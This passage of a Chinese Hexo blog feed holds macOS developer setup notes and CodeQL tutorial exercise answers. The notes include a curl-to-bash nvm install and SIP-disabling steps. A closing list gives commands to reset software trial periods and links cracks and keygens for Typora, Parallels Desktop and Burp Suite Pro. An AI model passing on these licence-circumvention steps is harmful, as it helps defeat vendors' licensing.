<code>otool -l /usr/sbin/tcpdump</code> ， 查看Mach -0 文件的加载命令信息，可以看到tcpdump会加载<code>/usr/lib/libpcap.A.dylib</code> ，但实际上并没有这个文件。原因：<a href="https://developer.apple.com/documentation/macos-release-notes/macos-big-sur-11_0_1-release-notes">https://developer.apple.com/documentation/macos-release-notes/macos-big-sur-11_0_1-release-notes</a> 的 62986286 部分，可知苹果系统将所有系统提供的库放到了动态链接缓存</li><li>icns文件：图标文件。读写该文件的工具：<a href="https://github.com/relikd/icnsutil">https://github.com/relikd/icnsutil</a></li><li>dmg文件：文件查看：7z软件、hidutil。双击打开dmg文件，系统将会将其挂载为一个虚拟磁盘（挂载在 /Volumes 目录下），并在 Finder 中“位置”一栏里显示（默认也会在桌面显示，可在访达-设置-通用-取消勾选外置磁盘 来关闭显示）。运行完后直接推出即可。若在Finder里的位置对磁盘映像右键 - 不在Finder显示后，可以在磁盘工具里还能看到，可在这推出磁盘。</li><li>.DS_Store文件：Desktop Services Store（桌面服务存储），用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。</li><li>.app目录：软件包，双击运行。</li></ul><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li>/Applications： 应用程序目录。该目录存放了系统与用户安装的应用程序，启动台（Launchpad）里可以看到所有安装的程序。</li><li>/Library： 存放系统应用的数据及文档信息。</li><li>/Network： 网络邻居虚拟目录。</li><li>/System/Library： 存放了系统运行的重要组件，如框架与内核模块。一些系统内置的第三方程序也在该目录下，如Perl</li><li>/Users: 所有用户的主目录都位于此目录下</li><li>/Volumes: 可移动媒体、磁盘、dmg镜像的挂载点。</li><li>~/Library/Preferences/<appid>/：存储应用程序的plist文件</li><li>~/Library/Containers/：每个开启了沙盒的软件都会在此目录下生成一个以程序标识符命名的子目录，此目录下会将一些系统特定的目录以软链接的形式创建在此目录中的Data目录下。</li><li>~/Library/Application Support/Core Data：另一种软件保存数据的地方，它本质上是对Sqlite数据库访问的一层外包装</li></ul><h1 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h1><h3 id="ClashX"><a href="#ClashX" class="headerlink" title="ClashX"></a>ClashX</h3><p><a href="https://clashx.org/clashx-download/">https://clashx.org/clashx-download/</a></p><ul><li><p>配置 - 托管配置 - 管理： 添加订阅地址</p></li><li><p>配置 - 托管配置，取消勾选自动更新：基于安全考虑，且不需要及时更新机场的节点变动、剩余流量和到期时间，可以取消掉</p></li><li><p>设置为系统代理的原理是，修改了系统设置。也可自己手动设置系统代理，在 系统设置 - 网络，选择一个网络设置代理</p></li><li><p>控制台 - 设置 - 代理模式：有三种：全局、规则、直连</p></li><li><p>控制台 - 代理 - 策略组：策略组（proxy-groups）有：延迟最低、故障转移、手动选择、负载均衡 四种模式：</p><ul><li>自动选择（url-test），每隔一段时间进行延迟测试，选择延迟最低的节点。</li><li>故障转移（fallback），每次都选组内第一个节点，无法使用再换到第二个，依次类推。</li><li>手动选择（select），手动选节点。</li><li>负载均衡（load-balance），每个节点都用用，由于很多机场都有连接数的限制，因此实际使用较少。</li></ul><p>当代理模式为“规则”时，根据规则匹配使用指定的策略组</p></li></ul><h3 id="golang多版本"><a href="#golang多版本" class="headerlink" title="golang多版本"></a>golang多版本</h3><p><a href="https://github.com/voidint/g">https://github.com/voidint/g</a></p><ol><li><p>下载<a href="https://github.com/voidint/g/releases">release</a>的二进制压缩包</p></li><li><p>将压缩包解压至<code>PATH</code>环境变量目录下（推荐<code>~/.g/bin</code>目录），将<code>~/.g/bin/g</code>重命名为<code>~/.g/bin/gvm</code>，（因为<code>g</code>太短容易冲突）</p></li><li><p>将所需的环境变量写入<code>~/.g/env</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># g shell setup</span><br><span class="hljs-built_in">export</span> GOROOT=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;HOME&#125;</span>/.g/go&quot;</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;HOME&#125;</span>/.g/bin:<span class="hljs-variable">$&#123;GOROOT&#125;</span>/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br><span class="hljs-built_in">export</span> G_MIRROR=https://golang.google.cn/dl/<br></code></pre></div></td></tr></table></figure></li><li><p>将<code>~/.g/env</code>导入到shell环境配置文件：<code>vim ~/.bashrc</code>：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># g shell setup</span><br><span class="hljs-keyword">if</span> [ -f <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;HOME&#125;</span>/.g/env&quot;</span> ]; <span class="hljs-keyword">then</span><br>    . <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;HOME&#125;</span>/.g/env&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure></li><li><p>启用环境变量：<code>source ~/.bashrc</code></p></li><li><p>安装指定版本的golang：<code>gvm install 1.20.4</code></p></li></ol><h3 id="多Java版本管理"><a href="#多Java版本管理" class="headerlink" title="多Java版本管理"></a>多Java版本管理</h3><ol><li>在 <a href="https://www.oracle.com/java/technologies/downloads/archive/">https://www.oracle.com/java/technologies/downloads/archive/</a> 下载  Java SE 8 (8u202 and earlier) 和 Java SE 20 。 下载Java SE Development Kit 的 MacOS dmg包（M2芯片选AARCH64架构），双击启动，安装。</li><li>vim ~/.bashrc：</li></ol><figure class="highlight jsx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jsx"># <span class="hljs-title class_">Java</span> config<br><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">JAVA_8_HOME</span>=<span class="hljs-string">&quot;/Library/Java/JavaVirtualMachines/jdk1.8.0_202.jdk/Contents/Home&quot;</span><br><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">JAVA_20_HOME</span>=<span class="hljs-string">&quot;/Library/Java/JavaVirtualMachines/jdk-20.jdk/Contents/Home&quot;</span><br><br># config <span class="hljs-title class_">Java</span> alias<br>alias jdk8=<span class="hljs-string">&quot;export JAVA_HOME=$JAVA_8_HOME&quot;</span><br>alias jdk20=<span class="hljs-string">&quot;export JAVA_HOME=$JAVA_20_HOME&quot;</span><br><br># config <span class="hljs-keyword">default</span> jdk<br><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">JAVA_HOME</span>=$JAVA_8_HOME<br><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">PATH</span>=<span class="hljs-string">&quot;$JAVA_HOME:$PATH&quot;</span><br></code></pre></div></td></tr></table></figure><ol><li>在 <code>~/.zshrc</code> 里加上  <code>source ~/.bashrc</code> 这句</li></ol><h3 id="多npm版本管理"><a href="#多npm版本管理" class="headerlink" title="多npm版本管理"></a>多npm版本管理</h3><p>安装nvm：<a href="https://github.com/nvm-sh/nvm">https://github.com/nvm-sh/nvm</a></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">curl -o- &lt;https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh&gt; | bash<br><br><span class="hljs-comment"># vim ~/.bashrc ，加上：</span><br><br><span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.nvm&quot;</span><br>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \\. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span>  <span class="hljs-comment"># This loads nvm</span><br>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/bash_completion&quot;</span> ] &amp;&amp; \\. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/bash_completion&quot;</span>  <span class="hljs-comment"># This loads nvm bash_completion</span><br><br><span class="hljs-comment"># 安装nodejs、npm</span><br>nvm install node<br><br><span class="hljs-comment"># 安装hexo</span><br>npm install hexo-cli -g<br>npm install hexo-deployer-git --save<br></code></pre></div></td></tr></table></figure><h3 id="Tabby终端"><a href="#Tabby终端" class="headerlink" title="Tabby终端"></a>Tabby终端</h3><p>Tabby终端：<a href="https://github.com/Eugeny/tabby，">https://github.com/Eugeny/tabby，</a> 基于nodejs electron编写的，占内存多。之所以选这个终端软件，是因为当时看它Github介绍那图片，以为不用设置一堆就那么好看了，结果还是要装oh-my-zsh，配置一堆。</p><p>一些设置：</p><ul><li>Preference - 应用 - Tabby集成。 Finder 右键一个目录 - 快速操作 - 自定义， 将Tabby勾选上</li><li>Preference - 配色方案，选一个背景颜色看起来可以的就行</li><li>该终端下Command + 左/右方向键，光标移动到行首或行尾（该快捷键在其他应用下的也是一样的效果）</li><li>删除光标到行首的字符：默认按Control + U是删除整行，无论光标在哪个位置。 点 Tabby - Preferences - 快捷键 - 删除整行，将该快捷键设置为Control + U即可</li></ul><p>zsh：MacOS默认使用zsh</p><ul><li>兼容Bash</li><li>命令选项补全：如输入<code>git</code> 再按TAB键</li><li>等等特性</li></ul><p>oh-my-zsh安装：<a href="https://ohmyz.sh/#install">https://ohmyz.sh/#install</a> （运行它的安装脚本会被覆盖掉 <code>~/.zshrc</code> ，所以需事先备份下这个文件）</p><ul><li>禁用自动更新：修改<code>~/.zshrc</code>，取消注释 <code>zstyle &#39;:omz:update&#39; mode disabled</code></li><li>关掉 URL 反斜杠转义：修改<code>~/.zshrc</code>，取消注释 <code>DISABLE_MAGIC_FUNCTIONS=true</code> ， （就是在粘贴URL地址时一些特殊符号前面会加上反斜杠的问题）</li><li>安装p10k主题，参考：<a href="https://github.com/romkatv/powerlevel10k#oh-my-zsh，">https://github.com/romkatv/powerlevel10k#oh-my-zsh，</a> 新建一个终端或者执行<code>p10k configure</code>配置，按提示进行配置（在选择编码时，选择Unicode，主题会好看些）。</li><li>若p10k的prompt的unicode图标显示不出，但在上一步的<code>p10k configure</code>过程中明明是可以显示的。 则配置下字体： Tabby - Preferences - 外观 - 字体：选择Hack Nerd Font Mono。</li><li>若macOS自带的终端应用里，p10k的unicode图标显示不出，则 终端 - 设置 - 描述文件，更改字体为 Hack Nerd font Mono。</li><li>附：安装hack-nerd字体，参考：<a href="https://github.com/ryanoasis/nerd-fonts#option-4-homebrew-fonts。">https://github.com/ryanoasis/nerd-fonts#option-4-homebrew-fonts。</a> （似乎MacOS默认已有该字体了，可打开“字体库app”确认下）</li></ul><h3 id="Parallels-Desktop"><a href="#Parallels-Desktop" class="headerlink" title="Parallels Desktop"></a>Parallels Desktop</h3><p>版本：<code>https://download.parallels.com/desktop/v18/18.1.1-53328/ParallelsDesktop-18.1.1-53328.dmg</code></p><p>操作：</p><ul><li>打开多个虚拟机：窗口 - 控制中心</li><li>取消自动更新：偏好设置 - 通用 - 检查更新， 从不</li><li>有bug，容易卡住，也不知道怎么回事，如果遇到就重启虚拟机</li></ul><p>镜像下载：</p><ul><li><p>Kali Linux：渗透使用。下载iso镜像，Apple Silicon (ARM64)版： <a href="https://www.kali.org/get-kali/#kali-installer-images。Kali">https://www.kali.org/get-kali/#kali-installer-images。Kali</a> 2023.1 ARM64</p><ul><li>添加虚拟机过程中，取消勾选“在Mac桌面上创建别名”，勾选“安装前设定”，可设置下内存之类的</li><li>kali虚拟机安装过程中：位置选中国（这样系统字体才不是繁体字）</li><li>kali虚拟机安装后：安装 Parallels Tools</li></ul><p>上面这种下载Kali 2023.1 ARM64镜像再自己安装的方式，虚拟机内会出现鼠标失灵、键盘失灵，或键盘按一个字符就输了三次该字符的问题。所以还是直接用Paralles Desktop提供的kali 2022.2镜像。</p><ul><li>执行完 <code>sudo apt update</code> 和 <code>sudo apt upgrade</code> ， 打个快照</li><li>安装中文输入法：<code>apt-get install fcitx fcitx-googlepinyin</code>。点击右上角键盘按钮 - Configure - Input Method，添加一项Google Pinyin，并将其排到最顶。再点击 Global Config 栏，设置 Trigger Input Method 的快捷键为 LShift 和 RShift ，这样就可以用Shift键切换中英文了。</li><li>取消共享：默认会将宿主机Mac的一些文件共享给Linux虚拟机。操作 - 配置 - 选项 - 共享 - 共享Mac，取消勾选“与Linux共享自定义Mac文件”等。</li></ul></li><li><p>Windows 11：逆向、渗透使用。</p><ul><li>取消共享：默认会将宿主机Mac的一些文件共享给Win虚拟机，Win虚拟机的文件也可以被宿主机访问（后者我就不取消了）。 操作 - 配置 - 选项 - 共享 - 共享Mac，取消勾选“镜像Mac和Windows用户文件夹”（共享Mac：宿主机Mac的一些文件可被Win虚拟机访问；共享Windows：Win虚拟机下的文件可被宿主机Mac访问。）</li><li>文件传输：可以直接拖动文件或Command + C 、 Command + V</li></ul></li><li><p>MacOS 13：</p><ul><li>Parallels Desktop对MacOS 虚拟机没有设置按钮，要设置内存、网络等需在MacOS虚拟机里用命令去设置，参考：<a href="https://kb.parallels.com/128842">https://kb.parallels.com/128842</a></li><li>开启文件共享，参考： <a href="https://sspai.com/post/61388。">https://sspai.com/post/61388。</a> 在宿主机连接共享文件时总连不上（点连接按钮时窗口抖动了几下），通过重启虚拟机解决。</li><li>MacOS 下的 Parallels Tools ，目前仅支持 共享粘贴板 的功能</li><li>关闭Mac虚拟机的SIP机制：在 Parallels Desktop 控制台，右键MacOS - 以恢复模式启动，点击菜单栏打开终端，再执行 <code>csrutil disable</code> 或 <code>csrutil enable --without dtrace</code> （只关闭SIP对dtrace的限制），重启虚拟机</li></ul></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有其它一些免费的软件：</p><ul><li>Homebrew</li><li>XCode</li><li>VSCode</li><li>Chrome</li><li>Notion笔记（<a href="https://www.notion.so/desktop）">https://www.notion.so/desktop）</a></li></ul><p>一些软件可以通过重置试用期来达到无限使用，如：</p><ul><li>Navicat Premium（<a href="https://www.navicat.com/en/download/navicat-premium）：[https://gitee.com/ProgHub/unlimited_trial_navicat_premium/blob/master/Mac/reset_navicat.sh]">https://www.navicat.com/en/download/navicat-premium）：[https://gitee.com/ProgHub/unlimited_trial_navicat_premium/blob/master/Mac/reset_navicat.sh]</a>(<a href="https://gitee.com/ProgHub/unlimited_trial_navicat_premium/blob/master/Mac/">https://gitee.com/ProgHub/unlimited_trial_navicat_premium/blob/master/Mac/</a> reset_navicat_by_52pojie.sh)</li><li>Beyond Compare（<a href="https://www.scootersoftware.com/download）：`rm">https://www.scootersoftware.com/download）：`rm</a> ~/Library/Application\ Support/Beyond\ Compare/registry.dat`</li><li>010 Editor（<a href="https://www.sweetscape.com/download/010editor/">https://www.sweetscape.com/download/010editor/</a> ）：<code>rm ~/.config/SweetScape/010\\ Editor.ini</code></li></ul><p>有的试用期到了还能用，不知道怎么回事。像：</p><ul><li>PasteNow（<a href="https://pastenow.app/）：这是个粘贴板历史软件">https://pastenow.app/）：这是个粘贴板历史软件</a></li></ul><p>有的网上有公开如何破解：</p><ul><li>Typora（<a href="https://typora.io/releases/all）：https://bbs.kanxue.com/thread-273420.htm">https://typora.io/releases/all）：https://bbs.kanxue.com/thread-273420.htm</a></li><li>Parallels Desktop：<a href="https://git.icrack.day/somebasj/ParallelsDesktopCrack">https://git.icrack.day/somebasj/ParallelsDesktopCrack</a></li><li>Burpsuite Pro：<a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">https://github.com/h3110w0r1d-y/BurpLoaderKeygen</a></li></ul><p>有的网上找个注册码就行了：</p><ul><li>Proxifier for Mac v3（<a href="https://www.proxifier.com/download/）。">https://www.proxifier.com/download/）。</a></li></ul><p>或者tb买激活码：</p><ul><li>JetBrain的IDE，GoLand、PyCharm、IDEA等</li></ul><p>有条件的话就支持正版吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>MacOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CodeQL官方教程中几道QL练习题</title>
    <link href="/2021/03/04/codeql-exercises-from-ql-tutorial/"/>
    <url>/2021/03/04/codeql-exercises-from-ql-tutorial/</url>
    
    <content type="html"><![CDATA[<p>跟着CodeQL官方的<a href="https://codeql.github.com/docs/writing-codeql-queries/ql-tutorials/#ql-tutorials">QL tutorials</a>做练习，在<a href="https://codeql.github.com/docs/writing-codeql-queries/crown-the-rightful-heir/">Crown the rightful heir</a>这一章节中有五个问题，来做一做。在看这篇文章之前需先跟着官方的QL tutorial做一遍。</p><p>下面的CodeQL代码，直接放到<a href="https://lgtm.com/query/6710025057257064639/">这里</a>运行即可</p><h4 id="What-is-the-most-common-hair-color-in-the-village-And-in-each-region"><a href="#What-is-the-most-common-hair-color-in-the-village-And-in-each-region" class="headerlink" title="What is the most common hair color in the village? And in each region?"></a>What is the most common hair color in the village? And in each region?</h4><p>第一个问题：村里发色最多的一种是哪种颜色</p><figure class="highlight scala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> tutorial<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HairColor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">string</span></span>&#123;<br>  <span class="hljs-type">HairColor</span>()&#123;<br>    exists(<span class="hljs-type">Person</span> p | <span class="hljs-keyword">this</span> = p.getHairColor())<br>  &#125;<br>  <br>  int ct()&#123;<br>    result = count(<span class="hljs-type">Person</span> p | p.getHairColor() = <span class="hljs-keyword">this</span> | p)<br>  &#125;<br>  <br>&#125;<br><br><br>from <span class="hljs-type">HairColor</span> c<br>where not exists(<span class="hljs-type">HairColor</span> c1 | c1.ct() &gt; c.ct())<br>select c, c.ct()<br></code></pre></div></td></tr></table></figure><p>执行结果：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">brown</span><span class="hljs-number">46</span><br></code></pre></div></td></tr></table></figure><p>第二个问题：每个地区发色最多的一种是哪种颜色</p><figure class="highlight scala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> tutorial<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HairColor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">string</span></span>&#123;<br>  <span class="hljs-type">HairColor</span>()&#123;<br>    exists(<span class="hljs-type">Person</span> p | <span class="hljs-keyword">this</span> = p.getHairColor())<br>  &#125;<br>  <br>  <span class="hljs-comment">// int ct()&#123;</span><br>  <span class="hljs-comment">//   result = count(Person p | p.getHairColor() = this | p)</span><br>  <span class="hljs-comment">// &#125;</span><br>  <br>  int ctOfLocation(<span class="hljs-type">Location</span> loc)&#123; <br>    result = count(<span class="hljs-type">Person</span> p | p.getLocation() = loc and p.getHairColor() = <span class="hljs-keyword">this</span> | p)<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Location</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">string</span></span>&#123;<br>  <span class="hljs-type">Location</span>() &#123;<br>    <span class="hljs-keyword">this</span> in [<span class="hljs-string">&quot;east&quot;</span>, <span class="hljs-string">&quot;west&quot;</span>, <span class="hljs-string">&quot;south&quot;</span>, <span class="hljs-string">&quot;north&quot;</span>]<br>  &#125;<br>&#125;<br><br>from <span class="hljs-type">Location</span> location, <span class="hljs-type">HairColor</span> c<br>where c.ctOfLocation(location) = max(<span class="hljs-type">HairColor</span> c1 | | c1.ctOfLocation(location) )<br>select location, c, c.ctOfLocation(location)<br><br><br></code></pre></div></td></tr></table></figure><p>执行结果：</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">west<span class="hljs-keyword">brown</span><span class="hljs-number">7</span><br>east<span class="hljs-keyword">brown</span><span class="hljs-number">11</span><br><span class="hljs-keyword">north</span><span class="hljs-keyword">black</span><span class="hljs-number">8</span><br>south<span class="hljs-keyword">brown</span><span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><p>说明下：各地区拥有brown发色的人的个数分别是：</p><ul><li>西部：7</li><li>东部：11</li><li>北部：3</li><li>南部：10</li><li>无地区：15 （也就是<code>Person.getLocation()</code>为空的人）</li></ul><p>总数就是46，符合第一个问题的查询结果。</p><h4 id="Which-villager-has-the-most-children-Who-has-the-most-descendants"><a href="#Which-villager-has-the-most-children-Who-has-the-most-descendants" class="headerlink" title="Which villager has the most children? Who has the most descendants?"></a>Which villager has the most children? Who has the most descendants?</h4><p>第一个问题：哪位村民拥有最多小孩</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">import tutorial<br><br>Person child<span class="hljs-constructor">Of(Person <span class="hljs-params">p</span>)</span> &#123;<br>  p = parent<span class="hljs-constructor">Of(<span class="hljs-params">result</span>)</span><br>&#125;<br><br><span class="hljs-built_in">int</span> children<span class="hljs-constructor">Number(Person <span class="hljs-params">p</span>)</span> &#123;<br>  result = count(Person c <span class="hljs-pattern-match">| c = child<span class="hljs-constructor">Of(<span class="hljs-params">p</span>)</span> | c)</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">from <span class="hljs-constructor">Person</span> p</span><br><span class="hljs-pattern-match">where children<span class="hljs-constructor">Number(<span class="hljs-params">p</span>)</span> = max(<span class="hljs-constructor">Person</span> q | | children<span class="hljs-constructor">Number(<span class="hljs-params">q</span>)</span>)</span><br><span class="hljs-pattern-match">select p, children<span class="hljs-constructor">Number(<span class="hljs-params">p</span>)</span></span><br></code></pre></div></td></tr></table></figure><p>第二个问题：哪位村民拥有最多后代</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">import tutorial<br><br>Person descendant<span class="hljs-constructor">Of(Person <span class="hljs-params">p</span>)</span> &#123;<br>  p = parentOf+(result)<br>&#125;<br><br><span class="hljs-built_in">int</span> descendant<span class="hljs-constructor">Number(Person <span class="hljs-params">p</span>)</span> &#123;<br>  result = count(Person c <span class="hljs-pattern-match">| c = descendant<span class="hljs-constructor">Of(<span class="hljs-params">p</span>)</span> | c)</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">from <span class="hljs-constructor">Person</span> p</span><br><span class="hljs-pattern-match">where descendant<span class="hljs-constructor">Number(<span class="hljs-params">p</span>)</span> = max(<span class="hljs-constructor">Person</span> q | | descendant<span class="hljs-constructor">Number(<span class="hljs-params">q</span>)</span>)</span><br><span class="hljs-pattern-match">select p, descendant<span class="hljs-constructor">Number(<span class="hljs-params">p</span>)</span></span><br></code></pre></div></td></tr></table></figure><h4 id="How-many-people-live-in-each-region-of-the-village"><a href="#How-many-people-live-in-each-region-of-the-village" class="headerlink" title="How many people live in each region of the village?"></a>How many people live in each region of the village?</h4><p>各地区分别有多少人居住：</p><figure class="highlight scala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> tutorial<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Location</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">string</span></span>&#123;<br>  <span class="hljs-type">Location</span>() &#123;<br>    <span class="hljs-keyword">this</span> in [<span class="hljs-string">&quot;east&quot;</span>, <span class="hljs-string">&quot;west&quot;</span>, <span class="hljs-string">&quot;south&quot;</span>, <span class="hljs-string">&quot;north&quot;</span>]<br>  &#125;<br>&#125;<br><br>from <span class="hljs-type">Location</span> location<br>select location, count(<span class="hljs-type">Person</span> p |  p.getLocation() = location | p)<br></code></pre></div></td></tr></table></figure><p>（查询结果不包含20位无地区的人员）</p><h4 id="Do-all-villagers-live-in-the-same-region-of-the-village-as-their-parents"><a href="#Do-all-villagers-live-in-the-same-region-of-the-village-as-their-parents" class="headerlink" title="Do all villagers live in the same region of the village as their parents?"></a>Do all villagers live in the same region of the village as their parents?</h4><p>找出跟他家长不住在同一地区的人：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import tutorial<br><br><br>from Person <span class="hljs-selector-tag">p</span>, Person c<br>where <span class="hljs-selector-tag">p</span> = <span class="hljs-built_in">parentOf</span>(c) and <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.getLocation</span>() != c<span class="hljs-selector-class">.getLocation</span>()<br>select c<br></code></pre></div></td></tr></table></figure><h4 id="Find-out-whether-there-are-any-time-travelers-in-the-village-Hint-Look-for-“impossible”-family-relations"><a href="#Find-out-whether-there-are-any-time-travelers-in-the-village-Hint-Look-for-“impossible”-family-relations" class="headerlink" title="Find out whether there are any time travelers in the village! (Hint: Look for “impossible” family relations.)"></a>Find out whether there are any time travelers in the village! (Hint: Look for “impossible” family relations.)</h4><p>这个问题不太具体，我理解为：找出比他后代的年纪还小的人。</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function">import tutorial</span><br><span class="hljs-function"></span><br><span class="hljs-function">Person <span class="hljs-title">descendantOf</span>(<span class="hljs-params">Person p</span>)</span> &#123;<br>  p = parentOf+(result)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">from</span> Person p</span><br><span class="hljs-function"><span class="hljs-keyword">where</span> <span class="hljs-title">exists</span>(<span class="hljs-params">Person c | c = descendantOf(p</span>) <span class="hljs-keyword">and</span> p.<span class="hljs-title">getAge</span>() &lt; c.<span class="hljs-title">getAge</span>())</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> p, p.<span class="hljs-title">getAge</span>()</span><br><span class="hljs-function"></span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CodeQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
